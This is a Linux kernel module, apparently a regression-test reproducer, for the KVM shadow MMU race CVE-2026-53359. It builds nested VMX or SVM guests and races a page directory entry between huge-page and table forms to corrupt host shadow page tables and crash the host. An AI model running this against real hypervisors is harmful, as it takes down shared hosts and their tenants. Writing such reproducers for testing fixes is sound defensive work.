// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2026 Hyunwoo Kim (@v4bel)
 * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
 */

/*
 * Kernel module that reproduces the CVE-2026-53359 shadow MMU race.
 * A writer thread toggles a nested page directory entry between 2 MiB
 * huge-page and 4 KiB page-table forms while faulter threads run L3
 * nested VMs that touch the racing mapping.  On VMX, optional flood
 * threads rapidly swap the EPT root pointer to increase shadow page
 * table churn, widening the race window.  On a vulnerable host the
 * race corrupts shadow page tables, triggering a BUG in
 * pte_list_remove().
 *
 * Supports both Intel VMX/EPT and AMD SVM/NPT (auto-detected).
 * Must be loaded inside a KVM guest with nested virtualisation enabled;
 * kvm_intel / kvm_amd must NOT be loaded in the guest.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/smp.h>
#include <linux/jiffies.h>
#include <linux/completion.h>
#include <asm/processor.h>
#include <asm/io.h>
#include <asm/desc.h>
#include <asm/svm.h>
#include <asm/msr-index.h>
/*
 * v7.1 (1aea80dd42cf) renamed vmcb_control_area.nested_ctl to misc_ctl
 * and dropped SVM_NESTED_CTL_NP_ENABLE.
 */
#ifdef SVM_NESTED_CTL_NP_ENABLE
#define VMCB_NP_CTL(c)	((c)->nested_ctl)
#else
#define SVM_NESTED_CTL_NP_ENABLE	(1ULL << 0)
#define VMCB_NP_CTL(c)	((c)->misc_ctl)
#endif

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("CVE-2026-53359 shadow MMU race reproducer");

static int run_ms = 5000;
module_param(run_ms, int, 0444);

static int nvcpu = 8;
module_param(nvcpu, int, 0444);

static int dwell = 256;
module_param(dwell, int, 0444);

static int nflood;
module_param(nflood, int, 0444);

/* EPT constants */
#define EPT_RWX		0x7ULL
#define EPT_MT_WB	(6ULL << 3)
#define EPT_LEAF	(EPT_RWX | EPT_MT_WB)
#define EPT_TBL		EPT_RWX
#define EPT_PS		(1ULL << 7)

/* Nested guest page-table constants */
#define PF_P		1ULL
#define PF_RW		2ULL
#define PF_US		4ULL
#define PF_PS_		0x80ULL
#define EFER_LME_	0x100ULL
#define EFER_LMA_	0x400ULL
#define EFER_SVME_	0x1000ULL

/* Guest-physical layout (low 2 MiB identity mapped via order-9 page) */
#define GDT_G		0xC000UL
#define TSS_G		0xD000UL
#define N_PML4		0x10000UL
#define N_PDPT		0x11000UL
#define N_PD		0x12000UL
#define N_CODE		0x13000UL
#define N_CODE_RACE	(N_CODE + 0x80)
#define N_STACK		0x15000UL
#define HV		0x800000UL
#define GVA_PRIME	(HV + (0x100UL << 12))
#define PDE_IDX		4UL
#define PRIME_IDX	0x100UL

#define MAXPG		8192
#define NPRESS		200

static struct page *pg_list[MAXPG];
static u8 pg_order[MAXPG];
static int npg;

static void track(struct page *p, int order)
{
	if (npg < MAXPG) {
		pg_list[npg] = p;
		pg_order[npg] = (u8)order;
		npg++;
	}
}

static void *apg(u64 *pa)
{
	struct page *p = alloc_page(GFP_KERNEL | __GFP_ZERO);

	if (!p)
		return NULL;
	track(p, 0);
	if (pa)
		*pa = page_to_phys(p);
	return page_address(p);
}

static void *apg_order(int order, u64 *pa)
{
	struct page *p = alloc_pages(GFP_KERNEL | __GFP_ZERO, order);

	if (!p)
		return NULL;
	track(p, order);
	if (pa)
		*pa = page_to_phys(p);
	return page_address(p);
}

static void free_pgs(void)
{
	int i;

	for (i = 0; i < npg; i++)
		__free_pages(pg_list[i], pg_order[i]);
	npg = 0;
}

/* Shared state */
static void *low_va;
static u64 low_pa;
static u64 *nest_pd, *nest_pt0, *ptg;
static u64 nest_pd_pa, nest_pt0_pa, ptg_pa, the_root;
static void *greg_va;
static u64 greg_pa, q_pa;
static u64 press_root[NPRESS];

static volatile int stop_all;
static volatile int writer_ready;
static DECLARE_COMPLETION(race_done);

static struct task_struct *threads[NR_CPUS];
static int role_of[NR_CPUS];
#define R_WRITER	0
#define R_FLOOD		1
#define R_FAULT		2

static unsigned long fcnt[NR_CPUS];
#define PHASE0_EVERY	8

static int use_amd;

/* L3 guest code: mov rax,[imm64]; vmcall/vmmcall; hlt */
static u8 ncode[] = {
	0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,
	0x48, 0x8b, 0x00,
	0x0f, 0x01, 0xc1,	/* vmcall (patched to vmmcall for AMD) */
	0xf4
};

static void wr_imm64(u8 *p, u64 v)
{
	int i;

	for (i = 0; i < 8; i++)
		p[i] = (u8)(v >> (8 * i));
}

static u64 next_grip(int cpu)
{
	unsigned long r = fcnt[cpu]++;

	return ((r % PHASE0_EVERY) == 0) ? N_CODE : N_CODE_RACE;
}

/* --------------- VMX helpers --------------- */

static inline u64 rdmsr_(u32 i)
{
	u32 lo, hi;

	asm volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(i));
	return ((u64)hi << 32) | lo;
}

static inline void wrmsr_(u32 i, u64 v)
{
	asm volatile("wrmsr" :: "c"(i),
		     "a"((u32)v), "d"((u32)(v >> 32)));
}

static inline u64 rd_cr4(void)
{
	u64 v;

	asm volatile("mov %%cr4,%0" : "=r"(v));
	return v;
}

static inline void wr_cr4(u64 v)
{
	asm volatile("mov %0,%%cr4" :: "r"(v) : "memory");
}

static inline u64 rd_cr3(void)
{
	u64 v;

	asm volatile("mov %%cr3,%0" : "=r"(v));
	return v;
}

static inline int vmxon_(u64 pa)
{
	u8 e;

	asm volatile("vmxon %1; setna %0"
		     : "=r"(e) : "m"(pa) : "cc", "memory");
	return e;
}

static inline void vmxoff_(void)
{
	asm volatile("vmxoff" ::: "cc");
}

static inline int vmclear_(u64 pa)
{
	u8 e;

	asm volatile("vmclear %1; setna %0"
		     : "=r"(e) : "m"(pa) : "cc", "memory");
	return e;
}

static inline int vmptrld_(u64 pa)
{
	u8 e;

	asm volatile("vmptrld %1; setna %0"
		     : "=r"(e) : "m"(pa) : "cc", "memory");
	return e;
}

static inline int vmwrite_(u64 f, u64 v)
{
	u8 e;

	asm volatile("vmwrite %2,%1; setna %0"
		     : "=r"(e) : "r"(f), "r"(v) : "cc");
	return e;
}

static u32 adj(u32 msr, u32 want)
{
	u64 m = rdmsr_(msr);

	return (u32)(((want | (u32)m) & (u32)(m >> 32)));
}

/* VMCS field encodings */
enum {
	MSR_BITMAP	= 0x2004, EPT_POINTER	= 0x201a,
	VMCS_LINK_PTR	= 0x2800, GUEST_IA32_EFER = 0x2806,
	H_IA32_EFER	= 0x2c02,
	PIN_BASED	= 0x4000, CPU_BASED	= 0x4002,
	EXCEPTION_BMP	= 0x4004, PFEC_MASK	= 0x4006,
	PFEC_MATCH	= 0x4008, CR3_TGT_CNT	= 0x400a,
	VM_EXIT_CTL	= 0x400c, VM_EXIT_MSR_ST = 0x400e,
	VM_EXIT_MSR_LD	= 0x4010, VM_ENTRY_CTL	= 0x4012,
	VM_ENTRY_MSR_LD	= 0x4014, VM_ENTRY_INTR	= 0x4016,
	TPR_THRESH	= 0x401c, SEC_EXEC	= 0x401e,
	G_ES_SEL	= 0x800,  G_CS_SEL	= 0x802,
	G_SS_SEL	= 0x804,  G_DS_SEL	= 0x806,
	G_FS_SEL	= 0x808,  G_GS_SEL	= 0x80a,
	G_LDTR_SEL	= 0x80c,  G_TR_SEL	= 0x80e,
	H_CS_SEL	= 0xc02,  H_SS_SEL	= 0xc04,
	H_DS_SEL	= 0xc06,  H_ES_SEL	= 0xc00,
	H_FS_SEL	= 0xc08,  H_GS_SEL	= 0xc0a,
	H_TR_SEL	= 0xc0c,
	G_ES_LIM	= 0x4800, G_CS_LIM	= 0x4802,
	G_SS_LIM	= 0x4804, G_DS_LIM	= 0x4806,
	G_FS_LIM	= 0x4808, G_GS_LIM	= 0x480a,
	G_LDTR_LIM	= 0x480c, G_TR_LIM	= 0x480e,
	G_GDTR_LIM	= 0x4810, G_IDTR_LIM	= 0x4812,
	G_ES_AR		= 0x4814, G_CS_AR	= 0x4816,
	G_SS_AR		= 0x4818, G_DS_AR	= 0x481a,
	G_FS_AR		= 0x481c, G_GS_AR	= 0x481e,
	G_LDTR_AR	= 0x4820, G_TR_AR	= 0x4822,
	G_INTR_INFO	= 0x4824, G_ACTIVITY	= 0x4826,
	G_SYSENTER_CS	= 0x482a, H_SYSENTER_CS	= 0x4c00,
	CR0_MASK_	= 0x6000, CR4_MASK_	= 0x6002,
	CR0_SHADOW	= 0x6004, CR4_SHADOW	= 0x6006,
	G_CR0		= 0x6800, G_CR3		= 0x6802,
	G_CR4		= 0x6804,
	G_ES_BASE	= 0x6806, G_CS_BASE	= 0x6808,
	G_SS_BASE	= 0x680a, G_DS_BASE	= 0x680c,
	G_FS_BASE	= 0x680e, G_GS_BASE	= 0x6810,
	G_LDTR_BASE	= 0x6812, G_TR_BASE	= 0x6814,
	G_GDTR_BASE	= 0x6816, G_IDTR_BASE	= 0x6818,
	G_DR7		= 0x681a, G_RSP		= 0x681c,
	G_RIP		= 0x681e, G_RFLAGS	= 0x6820,
	G_PENDDBG	= 0x6822,
	G_SYSENTER_ESP	= 0x6824, G_SYSENTER_EIP = 0x6826,
	H_CR0		= 0x6c00, H_CR3	= 0x6c02,
	H_CR4		= 0x6c04,
	H_FS_BASE	= 0x6c06, H_GS_BASE	= 0x6c08,
	H_TR_BASE	= 0x6c0a, H_GDTR_BASE	= 0x6c0c,
	H_IDTR_BASE	= 0x6c0e,
	H_SYSENTER_ESP	= 0x6c10, H_SYSENTER_EIP = 0x6c12,
	H_RSP		= 0x6c14, H_RIP	= 0x6c16,
};

#define CPU_USE_MSR_BMP	0x10000000u
#define CPU_SEC_CTLS	0x80000000u
#define SEC_EPT		0x2u
#define EXIT_HOST_ADDR	0x200u
#define EXIT_LOAD_EFER	0x200000u
#define ENTRY_IA32E	0x200u
#define ENTRY_LOAD_EFER	0x8000u

static u64 vmxon_pa[NR_CPUS], vmcs_pa[NR_CPUS];
static u64 msr_bmp_pa;

/* SVM state */
static u64 svm_guest_pa[NR_CPUS], svm_host_pa[NR_CPUS];
static u64 svm_hsave_pa[NR_CPUS];
static struct vmcb *svm_guest[NR_CPUS];
static u64 iopm_pa, msrpm_pa;

/* --------------- virt_ops abstraction --------------- */

struct virt_ops {
	int (*cpu_on)(int cpu);
	void (*cpu_off)(void);
	u64 (*huge_pte)(u64 pa);
	u64 (*tbl_pte)(u64 pa);
	u64 (*leaf4k)(u64 pa);
	u64 (*mk_root)(u64 pml4_pa);
	int (*vcpu_run)(int cpu);
};

static struct virt_ops *ops;

/* --------------- VMX back-end --------------- */

static unsigned long flood_cnt;

asmlinkage long vmexit_dispatch(void);
asmlinkage long vmexit_dispatch(void)
{
	int cpu = raw_smp_processor_id();
	u64 rip;

	if (stop_all)
		return 1;

	if (role_of[cpu] == R_FLOOD) {
		unsigned long r = __sync_fetch_and_add(&flood_cnt, 1);

		vmwrite_(EPT_POINTER, press_root[r % NPRESS]);
		vmwrite_(G_RIP, N_CODE);
		vmwrite_(G_RSP, N_STACK);
		vmwrite_(G_RFLAGS, 2);
		return 0;
	}

	rip = next_grip(cpu);
	vmwrite_(G_RIP, rip);
	vmwrite_(G_RSP, N_STACK);
	vmwrite_(G_RFLAGS, 2);
	return 0;
}

static noinline void run_guest(void)
{
	asm volatile("push %%rbp; push %%rbx; push %%r12;"
		"push %%r13; push %%r14; push %%r15\n"
		"mov $0x6c14,%%rdx; vmwrite %%rsp,%%rdx\n"
		"lea 1f(%%rip),%%rax; mov $0x6c16,%%rdx;"
		"vmwrite %%rax,%%rdx\n"
		"vmlaunch; jmp 3f\n"
		"1: call vmexit_dispatch;"
		"test %%rax,%%rax; jnz 2f; vmresume\n"
		"3:\n"
		"2: pop %%r15; pop %%r14; pop %%r13;"
		"pop %%r12; pop %%rbx; pop %%rbp\n"
		::: "rax", "rcx", "rdx", "rsi", "rdi",
		    "r8", "r9", "r10", "r11", "memory", "cc");
}

static void set_host_state(void)
{
	struct desc_ptr gdt, idt;
	u16 tr;
	u64 trbase = 0;

	asm volatile("sgdt %0" : "=m"(gdt));
	asm volatile("sidt %0" : "=m"(idt));
	asm volatile("str %0"  : "=m"(tr));

	if (tr) {
		struct desc_struct *d;

		d = (struct desc_struct *)(gdt.address + (tr & ~7));
		trbase = get_desc_base(d);
		trbase |= ((u64)((struct ldttss_desc *)d)->base3) << 32;
	}

	vmwrite_(H_CR0, read_cr0());
	vmwrite_(H_CR3, rd_cr3());
	vmwrite_(H_CR4, rd_cr4());
	vmwrite_(H_CS_SEL, __KERNEL_CS);
	vmwrite_(H_SS_SEL, __KERNEL_DS);
	vmwrite_(H_DS_SEL, __KERNEL_DS);
	vmwrite_(H_ES_SEL, __KERNEL_DS);
	vmwrite_(H_FS_SEL, 0);
	vmwrite_(H_GS_SEL, 0);
	vmwrite_(H_TR_SEL, tr);
	vmwrite_(H_GDTR_BASE, gdt.address);
	vmwrite_(H_IDTR_BASE, idt.address);
	vmwrite_(H_TR_BASE, trbase);
	vmwrite_(H_FS_BASE, rdmsr_(0xc0000100));
	vmwrite_(H_GS_BASE, rdmsr_(0xc0000101));
	vmwrite_(H_IA32_EFER, rdmsr_(0xc0000080));
	vmwrite_(H_SYSENTER_CS, 0);
	vmwrite_(H_SYSENTER_ESP, 0);
	vmwrite_(H_SYSENTER_EIP, 0);
}

static int vmx_cpu_on(int cpu)
{
	u64 cr4, fc, pa;
	void *v;

	cr4 = rd_cr4();
	wr_cr4(cr4 | (1ULL << 13));
	fc = rdmsr_(0x3a);
	if (!(fc & 1))
		wrmsr_(0x3a, fc | 0x5);

	v = apg(&pa);
	if (!v)
		return -ENOMEM;
	*(u32 *)v = (u32)rdmsr_(0x480);
	vmxon_pa[cpu] = pa;

	if (vmxon_(pa))
		return -EIO;
	return 0;
}

static void vmx_cpu_off(void)
{
	vmxoff_();
}

static u64 vmx_huge_pte(u64 pa) { return pa | EPT_LEAF | EPT_PS; }
static u64 vmx_tbl_pte(u64 pa)  { return pa | EPT_TBL; }
static u64 vmx_leaf4k(u64 pa)   { return pa | EPT_LEAF; }
static u64 vmx_mk_root(u64 pa)  { return pa | 0x1eULL; }

static int vmx_vcpu_run(int cpu)
{
	u64 pa, ncr0, ncr4;
	void *v;
	u32 pin, proc, sec, exitc, entryc;

	v = apg(&pa);
	if (!v)
		return -ENOMEM;
	*(u32 *)v = (u32)rdmsr_(0x480);
	vmcs_pa[cpu] = pa;

	if (vmclear_(pa) || vmptrld_(pa))
		return -EIO;

	ncr0 = (0x80050033ULL | rdmsr_(0x486)) & rdmsr_(0x487);
	ncr4 = (0x2020ULL | rdmsr_(0x488)) & rdmsr_(0x489);
	pin   = adj(0x48d, 0);
	proc  = adj(0x48e, CPU_USE_MSR_BMP | CPU_SEC_CTLS);
	sec   = adj(0x48b, SEC_EPT);
	exitc = adj(0x483, EXIT_HOST_ADDR | EXIT_LOAD_EFER);
	entryc = adj(0x484, ENTRY_IA32E | ENTRY_LOAD_EFER);

	if (!(proc & CPU_SEC_CTLS) || !(sec & SEC_EPT))
		return -ENODEV;

	vmwrite_(PIN_BASED, pin);
	vmwrite_(CPU_BASED, proc);
	vmwrite_(SEC_EXEC, sec);
	vmwrite_(EPT_POINTER, the_root);
	vmwrite_(EXCEPTION_BMP, 0);
	vmwrite_(PFEC_MASK, 0);
	vmwrite_(PFEC_MATCH, 0xffffffff);
	vmwrite_(CR3_TGT_CNT, 0);
	vmwrite_(VM_EXIT_CTL, exitc);
	vmwrite_(VM_EXIT_MSR_ST, 0);
	vmwrite_(VM_EXIT_MSR_LD, 0);
	vmwrite_(VM_ENTRY_CTL, entryc);
	vmwrite_(VM_ENTRY_MSR_LD, 0);
	vmwrite_(VM_ENTRY_INTR, 0);
	vmwrite_(TPR_THRESH, 0);
	vmwrite_(CR0_MASK_, 0);
	vmwrite_(CR4_MASK_, 0);
	vmwrite_(CR0_SHADOW, ncr0);
	vmwrite_(CR4_SHADOW, ncr4);
	vmwrite_(MSR_BITMAP, msr_bmp_pa);
	set_host_state();

	/* Guest segment state */
	vmwrite_(G_ES_SEL, 0x10); vmwrite_(G_CS_SEL, 0x8);
	vmwrite_(G_SS_SEL, 0x10); vmwrite_(G_DS_SEL, 0x10);
	vmwrite_(G_FS_SEL, 0x10); vmwrite_(G_GS_SEL, 0x10);
	vmwrite_(G_LDTR_SEL, 0);  vmwrite_(G_TR_SEL, 0x18);
	vmwrite_(VMCS_LINK_PTR, ~0ULL);
	vmwrite_(GUEST_IA32_EFER, 0x500);

	vmwrite_(G_ES_LIM, 0xffffffff); vmwrite_(G_CS_LIM, 0xffffffff);
	vmwrite_(G_SS_LIM, 0xffffffff); vmwrite_(G_DS_LIM, 0xffffffff);
	vmwrite_(G_FS_LIM, 0xffffffff); vmwrite_(G_GS_LIM, 0xffffffff);
	vmwrite_(G_LDTR_LIM, 0xffffffff); vmwrite_(G_TR_LIM, 0x67);
	vmwrite_(G_GDTR_LIM, 0xffff); vmwrite_(G_IDTR_LIM, 0xffff);

	vmwrite_(G_ES_AR, 0xc093); vmwrite_(G_CS_AR, 0xa09b);
	vmwrite_(G_SS_AR, 0xc093); vmwrite_(G_DS_AR, 0xc093);
	vmwrite_(G_FS_AR, 0xc093); vmwrite_(G_GS_AR, 0xc093);
	vmwrite_(G_LDTR_AR, 0x10000); vmwrite_(G_TR_AR, 0x8b);
	vmwrite_(G_INTR_INFO, 0); vmwrite_(G_ACTIVITY, 0);
	vmwrite_(G_SYSENTER_CS, 0);

	vmwrite_(G_CR0, ncr0); vmwrite_(G_CR3, N_PML4);
	vmwrite_(G_CR4, ncr4);
	vmwrite_(G_ES_BASE, 0); vmwrite_(G_CS_BASE, 0);
	vmwrite_(G_SS_BASE, 0); vmwrite_(G_DS_BASE, 0);
	vmwrite_(G_FS_BASE, 0); vmwrite_(G_GS_BASE, 0);
	vmwrite_(G_LDTR_BASE, 0); vmwrite_(G_TR_BASE, TSS_G);
	vmwrite_(G_GDTR_BASE, GDT_G); vmwrite_(G_IDTR_BASE, 0);
	vmwrite_(G_DR7, 0x400);
	vmwrite_(G_RSP, N_STACK); vmwrite_(G_RIP, N_CODE);
	vmwrite_(G_RFLAGS, 2); vmwrite_(G_PENDDBG, 0);
	vmwrite_(G_SYSENTER_ESP, 0); vmwrite_(G_SYSENTER_EIP, 0);

	/* Flood threads start with an alternate EPT root */
	if (role_of[cpu] == R_FLOOD)
		vmwrite_(EPT_POINTER, press_root[0]);

	while (!writer_ready && !stop_all)
		cpu_relax();

	run_guest();
	vmclear_(vmcs_pa[cpu]);
	return 0;
}

static struct virt_ops vmx_ops = {
	.cpu_on   = vmx_cpu_on,
	.cpu_off  = vmx_cpu_off,
	.huge_pte = vmx_huge_pte,
	.tbl_pte  = vmx_tbl_pte,
	.leaf4k   = vmx_leaf4k,
	.mk_root  = vmx_mk_root,
	.vcpu_run = vmx_vcpu_run,
};

/* --------------- SVM back-end --------------- */

static u64 svm_huge_pte(u64 pa) { return pa | PF_P | PF_RW | PF_US | PF_PS_; }
static u64 svm_tbl_pte(u64 pa)  { return pa | PF_P | PF_RW | PF_US; }
static u64 svm_leaf4k(u64 pa)   { return pa | PF_P | PF_RW | PF_US; }
static u64 svm_mk_root(u64 pa)  { return pa; }

static inline u16 svm_attr(u32 vmx_ar)
{
	return (u16)((vmx_ar & 0xff) | ((vmx_ar >> 4) & 0xf00));
}

static int svm_cpu_on(int cpu)
{
	u64 efer, vh, vmcb_g, vmcb_h;

	efer = rdmsr_(MSR_EFER);
	wrmsr_(MSR_EFER, efer | EFER_SVME_);

	if (!apg(&vh))
		return -ENOMEM;
	svm_hsave_pa[cpu] = vh;
	wrmsr_(MSR_VM_HSAVE_PA, vh);

	if (!apg(&vmcb_h))
		return -ENOMEM;
	svm_host_pa[cpu] = vmcb_h;

	svm_guest[cpu] = apg(&vmcb_g);
	if (!svm_guest[cpu])
		return -ENOMEM;
	svm_guest_pa[cpu] = vmcb_g;
	return 0;
}

static void svm_cpu_off(void)
{
	u64 e = rdmsr_(MSR_EFER);

	wrmsr_(MSR_EFER, e & ~EFER_SVME_);
}

static noinline void svm_do_vmrun(u64 gpa, u64 hpa)
{
	u64 g = gpa, h = hpa;

	asm volatile("clgi\n"
		"mov %1,%%rax; vmsave\n"
		"mov %0,%%rax; vmload; vmrun\n"
		"mov %0,%%rax; vmsave\n"
		"mov %1,%%rax; vmload\n"
		"stgi\n"
		: "+m"(g), "+m"(h) :
		: "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
		  "r8", "r9", "r10", "r11", "memory", "cc");
}

static void svm_seg(struct vmcb_seg *s, u16 sel, u32 ar,
		    u32 lim, u64 base)
{
	s->selector = sel;
	s->attrib = svm_attr(ar);
	s->limit = lim;
	s->base = base;
}

static int svm_vcpu_run(int cpu)
{
	struct vmcb *gv = svm_guest[cpu];
	struct vmcb_control_area *c = &gv->control;
	struct vmcb_save_area *s = &gv->save;

	memset(gv, 0, sizeof(*gv));
	c->intercepts[INTERCEPT_VMRUN / 32] |=
		1u << (INTERCEPT_VMRUN % 32);
	c->intercepts[INTERCEPT_VMMCALL / 32] |=
		1u << (INTERCEPT_VMMCALL % 32);
	c->intercepts[INTERCEPT_HLT / 32] |=
		1u << (INTERCEPT_HLT % 32);
	c->asid = 1;
	VMCB_NP_CTL(c) = SVM_NESTED_CTL_NP_ENABLE;
	c->nested_cr3 = the_root;
	c->iopm_base_pa = iopm_pa;
	c->msrpm_base_pa = msrpm_pa;
	c->clean = 0;

	s->efer = EFER_SVME_ | EFER_LME_ | EFER_LMA_;
	s->cr0  = 0x80050033ULL;
	s->cr3  = N_PML4;
	s->cr4  = 0x20ULL;
	s->rflags = 2;
	s->rip  = N_CODE;
	s->rsp  = N_STACK;
	s->dr7  = 0x400;
	s->g_pat = 0x0007040600070406ULL;

	svm_seg(&s->cs,   0x08, 0xa09b, 0xffffffff, 0);
	svm_seg(&s->ss,   0x10, 0xc093, 0xffffffff, 0);
	svm_seg(&s->ds,   0x10, 0xc093, 0xffffffff, 0);
	svm_seg(&s->es,   0x10, 0xc093, 0xffffffff, 0);
	svm_seg(&s->fs,   0x10, 0xc093, 0xffffffff, 0);
	svm_seg(&s->gs,   0x10, 0xc093, 0xffffffff, 0);
	svm_seg(&s->tr,   0x18, 0x008b, 0x67, TSS_G);
	svm_seg(&s->ldtr, 0, 0, 0, 0);
	svm_seg(&s->gdtr, 0, 0, 0xffff, GDT_G);
	svm_seg(&s->idtr, 0, 0, 0xffff, 0);

	while (!writer_ready && !stop_all)
		cpu_relax();

	while (!stop_all) {
		u64 rip = next_grip(cpu);

		s->rip = rip;
		s->rsp = N_STACK;
		s->rflags = 2;
		s->rax = 0;
		c->clean = 0;
		svm_do_vmrun(svm_guest_pa[cpu], svm_host_pa[cpu]);
	}
	return 0;
}

static struct virt_ops svm_ops = {
	.cpu_on   = svm_cpu_on,
	.cpu_off  = svm_cpu_off,
	.huge_pte = svm_huge_pte,
	.tbl_pte  = svm_tbl_pte,
	.leaf4k   = svm_leaf4k,
	.mk_root  = svm_mk_root,
	.vcpu_run = svm_vcpu_run,
};

/* --------------- common world + threads --------------- */

static int build_world(void)
{
	int i;
	u64 *npml4, *npdpt, *npd;
	u64 a;
	u8 *lb;
	void *q_va;

	low_va = apg_order(9, &low_pa);
	if (!low_va)
		return -ENOMEM;
	lb = low_va;

	greg_va = apg_order(9, &greg_pa);
	if (!greg_va)
		return -ENOMEM;

	q_va = apg(&q_pa);
	if (!q_va)
		return -ENOMEM;
	for (i = 0; i < 512; i++)
		((u64 *)q_va)[i] = 0x4141414141414141ULL;

	npml4 = apg(&a);
	if (!npml4)
		return -ENOMEM;
	the_root = ops->mk_root(a);

	npdpt = apg(&a);
	if (!npdpt)
		return -ENOMEM;
	npml4[0] = ops->tbl_pte(a);

	nest_pd = apg(&nest_pd_pa);
	if (!nest_pd)
		return -ENOMEM;
	npdpt[0] = ops->tbl_pte(nest_pd_pa);

	nest_pt0 = apg(&nest_pt0_pa);
	if (!nest_pt0)
		return -ENOMEM;
	nest_pd[0] = ops->tbl_pte(nest_pt0_pa);

	ptg = (u64 *)greg_va;
	ptg_pa = greg_pa;
	for (i = 0; i < 512; i++)
		nest_pt0[i] = ops->leaf4k(low_pa + (u64)i * 0x1000);

	/* The racing PDE: starts as a 2 MiB huge mapping */
	nest_pd[PDE_IDX] = ops->huge_pte(greg_pa);
	for (i = 0; i < 512; i++)
		ptg[i] = 0;
	ptg[0] = ops->leaf4k(greg_pa);
	ptg[PRIME_IDX] = ops->leaf4k(q_pa);

	/* Build L3 guest identity-mapped page tables + code */
	npd = (u64 *)(lb + N_PD);
	*(u64 *)(lb + N_PML4) = N_PDPT | PF_P | PF_RW | PF_US;
	*(u64 *)(lb + N_PDPT) = N_PD   | PF_P | PF_RW | PF_US;
	npd[0]       = 0x0 | PF_P | PF_RW | PF_US | PF_PS_;
	npd[PDE_IDX] = HV  | PF_P | PF_RW | PF_US | PF_PS_;

	memcpy(lb + N_CODE, ncode, sizeof(ncode));
	wr_imm64(lb + N_CODE + 2, HV);
	memcpy(lb + N_CODE_RACE, ncode, sizeof(ncode));
	wr_imm64(lb + N_CODE_RACE + 2, GVA_PRIME);

	*(u64 *)(lb + GDT_G + 0x00) = 0;
	*(u64 *)(lb + GDT_G + 0x08) = 0x00AF9B000000FFFFULL;
	*(u64 *)(lb + GDT_G + 0x10) = 0x00CF93000000FFFFULL;
	*(u64 *)(lb + GDT_G + 0x18) = 0x00008900D0000067ULL;
	*(u64 *)(lb + GDT_G + 0x20) = 0;

	/*
	 * Build alternate EPT roots for VMX flood threads.  Each root
	 * has the same guest-physical layout but lives at a different
	 * host-physical address, forcing KVM to tear down and rebuild
	 * shadow page tables on every EPT_POINTER swap.
	 */
	if (!use_amd) {
		for (i = 0; i < NPRESS; i++) {
			u64 *pm, *pp, *pdp, *p0, *pt;
			u64 ppa, pda, pt0a, ptta;
			int j;

			pm = apg(&a);
			pp = apg(&ppa);
			if (!pm || !pp)
				break;
			pm[0] = ppa | EPT_TBL;

			pdp = apg(&pda);
			if (!pdp)
				break;
			pp[0] = pda | EPT_TBL;

			p0 = apg(&pt0a);
			pt = apg(&ptta);
			if (!p0 || !pt)
				break;
			pdp[0] = pt0a | EPT_TBL;
			pdp[PDE_IDX] = ptta | EPT_TBL;

			for (j = 0; j < 512; j++) {
				p0[j] = (low_pa + (u64)j * 0x1000) | EPT_LEAF;
				pt[j] = (greg_pa + (u64)j * 0x1000) | EPT_LEAF;
			}
			press_root[i] = a | 0x1eULL;
		}
	}

	return 0;
}

static int kthr(void *arg)
{
	int cpu = (int)(long)arg;

	if (ops->cpu_on(cpu))
		goto out;

	if (role_of[cpu] == R_WRITER) {
		unsigned long w = 0;
		unsigned long deadline;

		deadline = jiffies + msecs_to_jiffies(run_ms);
		writer_ready = 1;

		while (!stop_all) {
			volatile int k;

			nest_pd[PDE_IDX] = ops->huge_pte(greg_pa);
			for (k = 0; k < dwell; k++)
				cpu_relax();

			nest_pd[PDE_IDX] = ops->tbl_pte(ptg_pa);
			for (k = 0; k < dwell; k++)
				cpu_relax();

			if (((++w) & 0x3ff) == 0 && run_ms > 0 &&
			    time_after(jiffies, deadline)) {
				stop_all = 1;
				break;
			}
		}
		complete(&race_done);
	} else {
		ops->vcpu_run(cpu);
	}

	ops->cpu_off();
out:
	while (!kthread_should_stop())
		msleep(50);
	return 0;
}

static int virt_supported(int want_amd)
{
	u32 a, b, c, d;

	if (want_amd) {
		a = 0x80000001;
		asm volatile("cpuid"
			     : "=a"(a), "=b"(b), "=c"(c), "=d"(d)
			     : "0"(a), "2"(0));
		return !!(c & (1u << 2));
	}

	a = 1;
	asm volatile("cpuid"
		     : "=a"(a), "=b"(b), "=c"(c), "=d"(d)
		     : "0"(a), "2"(0));
	return !!(c & (1u << 5));
}

static int __init poc_init(void)
{
	int cpu, used;
	void *bmp;

	/* Auto-detect: try VMX first, then SVM */
	if (virt_supported(0)) {
		use_amd = 0;
		ops = &vmx_ops;
	} else if (virt_supported(1)) {
		use_amd = 1;
		ops = &svm_ops;
		ncode[13] = 0x0f;
		ncode[14] = 0x01;
		ncode[15] = 0xd9; /* vmmcall */
	} else {
		pr_err("januscape_mod: no VMX/SVM support\n");
		return -ENODEV;
	}

	if (build_world()) {
		free_pgs();
		return -ENOMEM;
	}

	bmp = apg(&msr_bmp_pa);
	if (bmp)
		memset(bmp, 0xff, 4096);

	if (use_amd) {
		if (!apg_order(2, &iopm_pa) || !apg_order(1, &msrpm_pa)) {
			free_pgs();
			return -ENOMEM;
		}
	}

	used = min_t(int, nvcpu, num_online_cpus());
	role_of[0] = R_WRITER;
	for (cpu = 1; cpu < used; cpu++)
		role_of[cpu] = (cpu <= nflood && !use_amd) ? R_FLOOD : R_FAULT;

	for (cpu = 0; cpu < used; cpu++) {
		threads[cpu] = kthread_create(kthr, (void *)(long)cpu,
					      "januscape_%d", cpu);
		if (IS_ERR(threads[cpu])) {
			stop_all = 1;
			break;
		}
		kthread_bind(threads[cpu], cpu);
		wake_up_process(threads[cpu]);
	}

	/* Block until the race completes or times out */
	wait_for_completion_timeout(&race_done,
				    msecs_to_jiffies(run_ms + 5000));
	stop_all = 1;
	msleep(200);

	for_each_possible_cpu(cpu)
		if (threads[cpu] && !IS_ERR(threads[cpu]))
			kthread_stop(threads[cpu]);

	free_pgs();
	return 0;
}

static void __exit poc_exit(void)
{
}

module_init(poc_init);
module_exit(poc_exit);
